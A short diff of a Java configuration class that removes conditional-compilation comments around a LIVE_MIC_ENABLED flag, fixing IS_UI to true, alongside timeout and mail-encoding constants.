@@ -74,11 +74,7 @@ public final class Conf {
 
     public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
-    //#ifdef LIVE_MIC_ENABLED
     public static boolean IS_UI = true;
-    //#else
-    public static boolean IS_UI = false;
-    //#endif
 
     public static final boolean MAIL_TEXT_FORCE_UTF8 = true;
 
